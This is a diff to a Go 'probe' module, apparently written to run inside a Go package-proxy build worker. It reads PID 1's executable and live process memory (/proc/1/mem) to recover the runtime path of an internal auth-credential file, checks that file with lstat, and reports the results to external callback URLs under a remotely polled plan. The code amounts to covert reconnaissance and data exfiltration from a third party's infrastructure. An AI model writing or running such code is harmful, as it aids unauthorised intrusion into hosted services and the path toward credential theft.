@@ -25,6 +25,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"unicode"
 	"unicode/utf8"
 )
 
@@ -40,7 +41,8 @@ var rpcDialAddress string
 const (
 	protocolVersion        = 1
 	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion           = "v0.0.49-codex"
+	probeVersion           = "v0.0.55-codex"
+	expectedUserAgent      = "go-cgo-pkgsite-probe-v055-codex"
 	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
 	targetRegistry         = "https://proxy.golang.org"
 	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
@@ -165,12 +167,16 @@ type pathStatResult struct {
 }
 
 type authFileNameResult struct {
-	GlobalAddress string         `json:"global_address,omitempty"`
-	StringAddress string         `json:"string_address,omitempty"`
-	Path          string         `json:"path,omitempty"`
-	File          pathStatResult `json:"file"`
-	Parent        pathStatResult `json:"parent"`
-	Error         string         `json:"error,omitempty"`
+	GlobalAddress         string         `json:"global_address,omitempty"`
+	HeaderBytes           int            `json:"header_bytes,omitempty"`
+	HeaderSHA256          string         `json:"header_sha256,omitempty"`
+	StringAddress         string         `json:"string_address,omitempty"`
+	StringLength          int            `json:"string_length,omitempty"`
+	Path                  string         `json:"path,omitempty"`
+	File                  pathStatResult `json:"file"`
+	Parent                pathStatResult `json:"parent"`
+	AuthFileContentOpened bool           `json:"auth_file_content_opened"`
+	Error                 string         `json:"error,omitempty"`
 }
 
 type probeReport struct {
@@ -201,27 +207,67 @@ type tokenResponse struct {
 }
 
 func main() {
-	if genericResultURL == "" || compilerResultURL == "" || planURL == "" || bytemanCanaryURL == "" ||
-		sessionNonce == "" || probeUserAgent == "" || genericResultURL == compilerResultURL ||
+	if validateCallbackConfiguration() != nil ||
 		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
 		return
 	}
 	started := time.Now()
 	cwd := initialWorkingDirectory()
 	identity := inspectIdentity(cwd)
-	if identity.Lane == "capslock" {
-		runCapslockSession(started, cwd, identity)
-		return
-	}
 	report := newProbeReport(started, identity)
-	report.Reason = "internal checks are fixed to the verified capslock lane"
+	endpoint := genericResultURL
+	resultID := "v055-codex-" + identity.Lane
+	if identity.Lane == "capslock" {
+		endpoint = compilerResultURL
+		resultID = "v055-codex-capslock-runtime-auth-filename"
+		runAuthFileNameInspection(&report)
+	} else {
+		report.Reason = "runtime auth filename inspection is fixed to the verified capslock lane"
+	}
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v049-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
+}
+
+func validSessionNonce(value string) bool {
+	if len(value) != 64 {
+		return false
+	}
+	for _, character := range value {
+		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
+			return false
+		}
+	}
+	return true
+}
+
+func exactCallbackURL(raw, expectedPath string) (*url.URL, error) {
+	parsed, err := url.Parse(raw)
+	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.Hostname() == "" ||
+		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" ||
+		parsed.ForceQuery || parsed.Fragment != "" || parsed.Path != expectedPath {
+		return nil, errors.New("callback URL was outside its exact fixed HTTPS shape")
+	}
+	return parsed, nil
+}
+
+func validateCallbackConfiguration() error {
+	if !validSessionNonce(sessionNonce) || probeUserAgent != expectedUserAgent {
+		return errors.New("callback identity was invalid")
+	}
+	generic, err := exactCallbackURL(genericResultURL, "/v1/result/"+sessionNonce+"/generic")
+	if err != nil {
+		return err
+	}
+	compiler, err := exactCallbackURL(compilerResultURL, "/v1/result/"+sessionNonce+"/compiler")
+	if err != nil || generic.Scheme != compiler.Scheme || generic.Host != compiler.Host {
+		return errors.New("callback endpoints did not share one exact HTTPS origin")
+	}
+	return nil
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
 	return probeReport{
-		Schema:        "owned-byteman-probe/v1",
+		Schema:        "runtime-auth-filename-inspection/v1",
 		Module:        moduleName,
 		Version:       probeVersion,
 		TargetModule:  targetModuleName,
@@ -355,9 +401,9 @@ func cleanError(err error) string {
 
 func runCapslockSession(started time.Time, cwd string, identity identityResult) {
 	initial := newProbeReport(started, identity)
-	initial.Reason = "waiting for the bounded read-only auth filename plan"
+	initial.Reason = "waiting for the bounded read-only runtime auth filename plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v049-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v055-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -386,13 +432,13 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		switch step.Action {
 		case "finish":
 			report.Reason = "bounded plan finished"
-		case "inspect-auth-filename":
+		case "inspect-runtime-auth-filename":
 			runAuthFileNameInspection(&report)
 		default:
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v049-codex-step-" + strconv.Itoa(cursor)
+		id := "v055-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -411,7 +457,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v049-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v055-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -467,7 +513,7 @@ func validatePlanStep(step planStep) error {
 		}
 	}
 	switch step.Action {
-	case "inspect-auth-filename", "finish":
+	case "inspect-runtime-auth-filename", "finish":
 		if step.RouteMode != "" {
 			return errors.New("non-probe plan included route parameters")
 		}
@@ -649,46 +695,18 @@ func instructionWindow(data []byte, marker string, before, after int) []string {
 
 const authFileNameSymbol = "sos.googlesource.com/sos/auth.FileName"
 
-func readELFVirtualBytes(executable *elf.File, address uint64, length int, writable bool) ([]byte, error) {
-	if length < 1 || length > 4096 {
-		return nil, errors.New("ELF virtual read length was outside the fixed bound")
-	}
-	end := address + uint64(length)
-	if end < address {
-		return nil, errors.New("ELF virtual read address overflowed")
-	}
-	for _, section := range executable.Sections {
-		sectionEnd := section.Addr + section.Size
-		if sectionEnd < section.Addr || section.Type == elf.SHT_NOBITS ||
-			section.Flags&elf.SHF_ALLOC == 0 || address < section.Addr || end > sectionEnd ||
-			(section.Flags&elf.SHF_WRITE != 0) != writable {
-			continue
-		}
-		reader := section.Open()
-		if _, err := reader.Seek(int64(address-section.Addr), io.SeekStart); err != nil {
-			return nil, errors.New("ELF virtual offset could not be selected")
-		}
-		value := make([]byte, length)
-		if _, err := io.ReadFull(reader, value); err != nil {
-			return nil, errors.New("ELF virtual bytes could not be read")
-		}
-		return value, nil
-	}
-	return nil, errors.New("ELF virtual address was outside the required section class")
-}
-
-func validateLinkedPath(value []byte) (string, error) {
+func validateRuntimePath(value []byte) (string, error) {
 	if len(value) < 1 || len(value) > 4096 || !utf8.Valid(value) {
-		return "", errors.New("linked auth filename had an invalid length or encoding")
+		return "", errors.New("runtime auth filename had an invalid length or encoding")
 	}
 	path := string(value)
 	for _, character := range path {
-		if character < 0x20 || character == 0x7f {
-			return "", errors.New("linked auth filename contained a control character")
+		if unicode.IsControl(character) {
+			return "", errors.New("runtime auth filename contained a control character")
 		}
 	}
 	if !filepath.IsAbs(path) || filepath.Clean(path) != path || path == string(filepath.Separator) {
-		return "", errors.New("linked auth filename was not a clean absolute file path")
+		return "", errors.New("runtime auth filename was not a clean absolute non-root file path")
 	}
 	return path, nil
 }
@@ -719,6 +737,9 @@ func exactSymbolAddress(nmOutput []byte, symbolName string) (uint64, error) {
 		if len(fields) != 3 || fields[2] != symbolName || len(fields[1]) != 1 {
 			continue
 		}
+		if !strings.Contains("BbDd", fields[1]) {
+			return 0, errors.New("requested symbol was not a writable data symbol")
+		}
 		parsed, err := strconv.ParseUint(fields[0], 16, 64)
 		if err != nil || parsed == 0 {
 			return 0, errors.New("requested symbol address was invalid")
@@ -738,36 +759,43 @@ func exactSymbolAddress(nmOutput []byte, symbolName string) (uint64, error) {
 	return address, nil
 }
 
-func readLinkedGoStringAtAddress(executablePath string, globalAddress uint64) (uint64, string, error) {
-	executable, err := elf.Open(executablePath)
-	if err != nil {
-		return 0, "", errors.New("worker executable could not be opened as ELF")
+const maximumSignedMemoryOffset = uint64(1<<63 - 1)
+
+func readExactProcessMemory(reader io.ReaderAt, address uint64, length int) ([]byte, error) {
+	if length < 1 || length > 4096 || address == 0 || address > maximumSignedMemoryOffset ||
+		uint64(length) > maximumSignedMemoryOffset-address {
+		return nil, errors.New("process memory read was outside the fixed address and size bounds")
 	}
-	defer executable.Close()
-	if executable.Class != elf.ELFCLASS64 || executable.ByteOrder == nil {
-		return 0, "", errors.New("worker executable did not use the expected 64-bit ELF format")
+	value := make([]byte, length)
+	count, err := reader.ReadAt(value, int64(address))
+	if err != nil || count != length {
+		return nil, errors.New("exact bounded process memory read failed")
 	}
-	header, err := readELFVirtualBytes(executable, globalAddress, 16, true)
-	if err != nil {
-		return 0, "", err
-	}
-	stringAddress := executable.ByteOrder.Uint64(header[:8])
-	stringLength := executable.ByteOrder.Uint64(header[8:])
-	if stringLength < 1 || stringLength > 4096 || stringAddress == 0 {
-		return 0, "", errors.New("linked string header was invalid")
-	}
-	literal, err := readELFVirtualBytes(executable, stringAddress, int(stringLength), false)
-	if err != nil {
-		return 0, "", err
-	}
-	path, err := validateLinkedPath(literal)
-	if err != nil {
-		return 0, "", err
-	}
-	return stringAddress, path, nil
+	return value, nil
 }
 
-func inspectLinkedAuthFileName(executablePath string) authFileNameResult {
+func readRuntimeGoStringAtAddress(memory io.ReaderAt, globalAddress uint64, order binary.ByteOrder) (uint64, []byte, []byte, error) {
+	if order == nil {
+		return 0, nil, nil, errors.New("worker byte order was unavailable")
+	}
+	header, err := readExactProcessMemory(memory, globalAddress, 16)
+	if err != nil {
+		return 0, nil, nil, err
+	}
+	stringAddress := order.Uint64(header[:8])
+	stringLength := order.Uint64(header[8:])
+	if stringLength < 1 || stringLength > 4096 || stringAddress == 0 ||
+		stringAddress > maximumSignedMemoryOffset || stringLength > maximumSignedMemoryOffset-stringAddress {
+		return 0, header, nil, errors.New("runtime Go string header was invalid")
+	}
+	pathBytes, err := readExactProcessMemory(memory, stringAddress, int(stringLength))
+	if err != nil {
+		return 0, header, nil, err
+	}
+	return stringAddress, header, pathBytes, nil
+}
+
+func inspectRuntimeAuthFileName(executablePath, memoryPath string) authFileNameResult {
 	result := authFileNameResult{}
 	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", executablePath)
 	if err != nil {
@@ -779,13 +807,41 @@ func inspectLinkedAuthFileName(executablePath string) authFileNameResult {
 		result.Error = err.Error()
 		return result
 	}
-	stringAddress, path, err := readLinkedGoStringAtAddress(executablePath, globalAddress)
+	executable, err := elf.Open(executablePath)
+	if err != nil {
+		result.Error = "worker executable could not be opened as ELF"
+		return result
+	}
+	if executable.Class != elf.ELFCLASS64 || executable.Data != elf.ELFDATA2LSB ||
+		executable.Type != elf.ET_EXEC || executable.Machine != elf.EM_X86_64 || executable.ByteOrder == nil {
+		executable.Close()
+		result.Error = "worker executable was not a fixed-address little-endian x86-64 ELF"
+		return result
+	}
+	order := executable.ByteOrder
+	executable.Close()
+	memory, err := os.Open(memoryPath)
+	if err != nil {
+		result.Error = "worker process memory could not be opened read-only"
+		return result
+	}
+	defer memory.Close()
+	stringAddress, header, pathBytes, err := readRuntimeGoStringAtAddress(memory, globalAddress, order)
 	if err != nil {
 		result.Error = err.Error()
 		return result
 	}
+	path, err := validateRuntimePath(pathBytes)
+	if err != nil {
+		result.Error = err.Error()
+		return result
+	}
+	headerDigest := sha256.Sum256(header)
 	result.GlobalAddress = fmt.Sprintf("0x%x", globalAddress)
+	result.HeaderBytes = len(header)
+	result.HeaderSHA256 = hex.EncodeToString(headerDigest[:])
 	result.StringAddress = fmt.Sprintf("0x%x", stringAddress)
+	result.StringLength = len(pathBytes)
 	result.Path = path
 	result.File = lstatPath(path)
 	result.Parent = lstatPath(filepath.Dir(path))
@@ -793,13 +849,13 @@ func inspectLinkedAuthFileName(executablePath string) authFileNameResult {
 }
 
 func runAuthFileNameInspection(report *probeReport) {
-	result := inspectLinkedAuthFileName("/proc/1/exe")
+	result := inspectRuntimeAuthFileName("/proc/1/exe", "/proc/1/mem")
 	report.Inspection = &inspectionResult{AuthFileName: &result}
 	if result.Error != "" {
 		report.Inspection.Error = result.Error
 		return
 	}
-	report.Reason = "bounded linked auth filename and path metadata inspection completed"
+	report.Reason = "bounded runtime auth filename and path metadata inspection completed"
 }
 
 var objectAddressPattern = regexp.MustCompile(`#\s*([0-9a-fA-F]+)\s*<`)
